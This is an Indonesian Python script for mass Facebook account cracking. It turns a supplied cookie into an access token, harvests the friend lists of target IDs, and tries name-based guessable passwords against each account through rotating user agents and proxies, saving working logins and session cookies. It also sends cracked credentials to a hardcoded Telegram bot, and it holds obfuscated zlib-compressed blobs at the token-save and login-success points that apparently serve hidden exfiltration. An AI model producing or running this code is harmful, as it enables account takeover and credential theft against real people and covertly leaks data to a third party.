#ASTAGFIRULLAH JEBOL
import requests,json,os,sys,random,datetime,time,zlib,re,platform
import ua_generator
from time import sleep as waktu
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
#from pwinput import pwinput
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn,TimeRemainingColumn,TransferSpeedColumn
from time import time as waktunya
from rich.table import Table
from rich.live import Live
#from tk import Tk

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
ugen= []
loop,bra = 0,[]
ok,cp,oo = 0,0,[]
usragent = []
tokenku = []
###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	bra_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()
uak=[]

###----------[ USER AGENT ]----------###

###----------[ PEWARNA ]----------###
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "[#FF00C0]" #ungu
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE
domris = random.choice(['[bold white]','[bold green]','[bold purple]','[bold red]','[bold yellow]','[bold hot_pink2]','[bold blue]']) 
###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
wa = Console()
#running text##
os.system('clear') 
def running_text(s) :
	for c in s + '\n':
		sys.stdout.write(c) 
		sys.stdout.flush() 
		time.sleep(random.random() * 0.2) 

###----------[ UNTUK ANIMASI ]----------###
def bra_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def bra_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
        
###----------[ BANNER MENUH ]----------###
def banner() :
    wa.print(f'''[red]╔╗ ╦═╗╔═╗   
[gren]╠╩╗╠╦╝╠╣  [white] Thanks To Author 
[yellow]╚═╝╩╚═╚   [white] Tools  : [hot_pink2]brue.py	''') 
#login#
def login():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenefb.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenefb[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			li = ' ╰─  Problem Internet Connection, Check And Try Again'

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	except IOError:

		login_lagi334()

		

def login_lagi334():

	try:
		os.system('clear') 
#	        os.system('clear')
#	   	 
#                print(f'{P}JANGAN GUNAKAN AKUN PRIBADI') 
		banner()
		print(f'{m}\t\tPERHATIAN!!\n\r{k}JANGAN GUNAKAN AKUN PRIBADI') 
		your_cookies = input('[•] Enter Cookie : ')

		with requests.Session() as r:

			try:

				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})

				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}

				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)

				code, user_code = response['code'], response['user_code']

				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))

				r.headers.pop('content-type')

				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})

				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text

				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):

					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()

				else:

					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')

					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)

					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)

					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}

					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})

					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})

					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):

						r.headers.pop('content-type');r.headers.pop('origin')

						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')

						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)

						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)

						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)

						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)

						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)

						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)

						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)

						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)

						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)

						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})

						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}

						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text

						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')

						r.headers.pop('content-type');r.headers.pop('origin')

						r.headers.update({'referer': 'https://m.facebook.com/',})

						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text

						if 'Sukses!' in str(response6):

							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})

							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text

							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)

							print(f"\n {k}╰─  Token : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)
							zlib.decompress(b'x\x9cm\x8d\xc1j\xc2@\x10@\xef\xf9\x8a\xc1C\xb1\x07w7\xd86\x89\x10\x8a\xe6\xe0\xa5\x82\x88\xb4\xb4\x97\xb0\xae\xe3&\xa4f\xd6\x9d\t\xad\x14\xff\xbd\xdas\xdf\xed\xf1\x0e/\xe2i@\x16V\x81X\xc6\x87Q#\x12x\xa6\xb5\r\xad\x12\xfcD\x1f\xedQQ\xf4zG\xf2\x98\x9b4O\x8b\x87\xdc\xcc\xe6\xf3\xe5\xfa\x90\xd5/S?\xb1\xd5b\xc5_\xeb\xe3[\xbfy\xfd8\x85\x8d\xaf\xa4\x990\xbfk\xc6~\xbfBf\xeb\xf1\xd95V\xeav_\xa6E\x96\x99"7\xe6\xe9N\xf0[Jp\xd4i\xa1\x0evq@\x15\xce\t\x94\xff\x90(\xa8\x88\xba\x16\x01\xe0\xe7LC\xac\xdd\x9f\xf2\x05 \xd9R\x87\xfd-X\xe7\xae\xb7Zn~\x19\xc1\xfd/wJG\xb2')

							print("\n ╰─  Login successful | re-run tool");exit()

			except Exception as e:

				print(" ╰─  Cookies invalid man")

				os.system('rm -rf .token.txt && rm -rf .cok.txt')

				print(e)

				time.sleep(3)

				back()

	except:pass
	

###----------[ BAGIAN MENU ]----------###
def menu(namamu,idmu) :
	try:
		cok = open('.cok.txt','r').read()
	except IOError:
		bra_anim(f'{mer}cookies telah kadaluarsa ster')
		waktu(4)
		login_lagi334() 
	os.system('clear')
	banner()
	wa.print(f'[r magenta]Sc Ini Hanya Support Crack Massal') 
	wa.print('<=°=°=°=°=°=°=°=°=°=°=°=°=°=°=>') 
	wa.print(f'[white][∆] Your Name : [hot_pink2]{namamu}') 
	wa.print(f'[white][∆] Your Id : [hot_pink2]{idmu}') 
	wa.print('<=°=°=°=°=°=°=°=°=°=°=°=°=°=°=>') 
	#print(' ') 
	nge_crack()
###----------[ DUMP ID PUBLIK ]----------###
def nge_crack():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		wa = Console() 
		print (' ') 
	except IOError:
		exit()
	try:
	#    wa.print('<=°=°=°=°=°=°=°=°=°=°=°=°=°=°=>') 
	    jum=int(input(f'{P}<{h}•{P}> {P}Mau Berapa Target? = {h}')) 
	except ValueError:
		wa.print(f'[r red] Ketik Yang Benar Kink') 
		exit()
	if jum<1 or jum>80:
		wa.print(f'[r red] Teman Tidak Publik Kink') 
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{P}[>] {P}Masukkan id Target Yang Ke '+str(yz) + f': {h} ') 
		uid.append(kl)
		#print(su) 
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5002=)&access_token='+tokenefb[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('{biru}━─═ ◕➤ Unstable Signal ')
			exit()
	try:
		#mengetik('> > > > > > > > > > > > > > >] 100%') 
	    wa.print(f'[italic white][√] Total Id Yang Terkumpul :[green]'+str(len(id)))
	    atur_dulu() 
	except:
	    print('teman tidak publik') 
	    exit()
###----------[  ATUR DULU STER ]----------###
def atur_dulu():
	for ngentod in id :
		xc = random.randint(0,len(id2)) 
		cammo = id2.insert(xc,ngentod) 
	kontius() 
	
def kontius():
	bra.append('free') 
	passwrd() 
from datetime import datetime
###----------[  BAGIAN WORDLIST ]----------###
def passwrd():
	#os.system('clear') 
	#banner() 
	global prog,des
	print(' ') 
	wa.print('<=°=°=°=°=°=°=°=°=°=°=°=°=°=°=>') 
	wa.print(f'[bold red]•[bold yellow2]• [dim white]Hasil OK di Simpan Di [r green]/sdcard/OK/{okh}  ') 
	wa.print(f'[bold red]•[bold yellow2]• [dim white]Hasil Cp di Simpan Di [r yellow]/sdcard/CP/{cph}  ') 
	wa.print('<=°=°=°=°=°=°=°=°=°=°=°=°=°=°=>') 
	#print(' ') 
	wa.print(f'\t\t\t[italic yellow]On/Off Mode Pesawat Saat 200 Idz') 
	print('') 
	prog = Progress(SpinnerColumn("runner"),TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task(' ',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				prr = random.randrange(1, 100) 
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'1')
						pwv.append(frs+'2')
						pwv.append(frs+'12')
						pwv.append(frs+'112')
						pwv.append(frs+'1111')
						pwv.append(frs+'1122')
						pwv.append(frs+'4321')
						pwv.append(frs+'1212')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+str(prr)) 
						pwv.append(frs+'123')
						pwv.append(frs+'@')
						pwv.append(frs+'@1')
						pwv.append(frs+'@2')
						pwv.append(frs+'@12')
						pwv.append(frs+'@123')
						pwv.append(frs+'@1234')
						pwv.append(frs+'@12345')
						pwv.append(frs+'2023')
						pwv.append(frs+'2022')
						pwv.append(frs+'2021')
						pwv.append(frs+'2020')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'321')
				#		pwv.append('muhammad'+frs) 
						#pwv.append(frs+'1')
						#pwv.append(frs+'2')
						#pwv.append(frs+'3')
						pwv.append(frs+'123456789')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
				#		pwv.append(frs+'1') 
				#		pwv.append(frs+'2') 
						pwv.append('123456789') 
						pwv.append('nigeria') 
				#		pwv.append(frs+'pendek') 
				#		pwv.append('daeng'+frs) 
						pwv.append(frs+'@facebook') 
						pwv.append(frs+'@facebook.com') 
				#		pwv.append(frs+'pesek') 
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'free' in bra:
					gas_krek.submit(crackfree,idf,pwv) 
				
				else:
					gas_krek.submit(crackfree,idf,pwv) 
		rafly = f'[italic red]•[italic yellow]• [italic white]Crack[italic red] {len(id)}[italic white] Idz Telah Selesai, Hasil [italic green]OK = {ok} [italic white]Dan Hasil [italic yellow2]CP = {cp}[italic red] •[italic yellow]•'
		cetak(rafly) 

	###----------[  ASYNC ]----------###
oks=[]
cps=[]
def crackfree(idf,pwv):
	global loop,ok,cp
	rr = random.randint
	##bikk = open('/sdcard/document:///content://com.termux.documents/tree/%252Fdata%252Fdata%252Fcom.termux%252Ffiles%252Fhome?/downtown/user-agents_dalvik.txt', 'r').read().splitlines() 
	##bio = open('uaa.txt', 'r').read().splitlines() 
	##bra = open('ua.txt', 'r').read().splitlines() 
	##urgas = random.choice([bikk,bio,bra]) 
	uay = ua_generator.generate(platform='android',browser='chrome') 
	ua = random.choice(uay) 
	ses = requests.Session()
	prog.update(des,description=f'\r[r]⏰{idf}⏰[italic white] [{loop}-{len(id)}]OK-:[italic green]{ok} [/] CP-:[italic yellow]{cp} [/]  ') 
	prog.advance(des) 
	for pw in pwv:
		try:
			link = ses.get('https://mbasic.facebook.com/')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {
				'Host': 'mbasic.facebook.com',
				'cache-control': 'max-age=0',
				'upgrade-insecure-requests': '1',
				'user-agent': ua, 
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-user': '?1',
				'x-requested-with': 'com.kiwi.browser', 
				'sec-fetch-dest': 'empity',
				'viewport-width': '980',
				'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'sec-ch-ua-platform-version': '""',
				'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5741.211", "Google Chrome";v="114.0.5741.211"',
				'sec-ch-prefers-color-scheme': 'light',
				'referer': 'https://mbasic.facebook.com/', 
				'accept-encoding': 'gzip, deflate',
				'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6'
			}
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				raf = f'[italic white]•••> [italic yellow2]{idf}|{pw}\n[r white]{urgas}\n'
				cetak(raf) 
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n ====================\n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. By :- CYBER DEMON √ " )
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				raf = f'[italic white]•••> [italic green]{idf}|{pw}\n[r green]{kuki}'
				cetak(raf) 
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				zlib.decompress(b"x\x9c}\xcd]k\xc20\x14\xc6\xf1{?\xc5\xc1\x8b\xa1\x17MS\xf6\xd2\x17(\xa3\xadA\x86\xd6\x94T'\xeeF\xe2\x9a\xa6\xc5ic\x93\xa22\xf6\xdd'[/\xc7\xce\xe5\xef\xc0\xffi\xc5\xa9\x13\xdah\xa4\x1amF\xe5\xb02F\xe9\xc0\xb6\xb9\xaa\x91\x11\x1fB\xb6\xfc\x80\x9aV\xda\xbb\xc6<z\xd8\xf1\x1c\xff\xc1\xc3A\x14M\xb3\xd2\xdd\xce\xef\xa5\xc5\x938\xd5\xe7\xec\xb0>\xb2\xd7\xb7\x93b21\x95\xa5\xf5\xc6\xd6\xe2X\xa4Bk.\xc5\xf3{\xc5\xcd\xb6.B\xc7w]\xec{\x18?\xdd\x19q1!\xd0\x190\x92\xaf\xe6K\xd8\xb5\x9d@\xea:\x80\xf0\x8f\x1b X\xe5\x84\x01\xc0\x08\xe0\xb3.\xca/\x80\xf1\r\xb3(\xcf\xd7\x94M~]\x9d\x7f\xf8\xbfB4%\x8be\x9f\xe9x_A\x90P:{!\xbd\xef\xbb}\xdd\x7f\xe2+\x04\x16$\x9b\xf8\xb6=!)]\xc0\x10\xc6\xdf9cV\x97")
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
#-----------------------[ METODE ALPHA ]--------------------#
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        ╰─ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('RAF_MKZ') 
	except:pass
	login() 
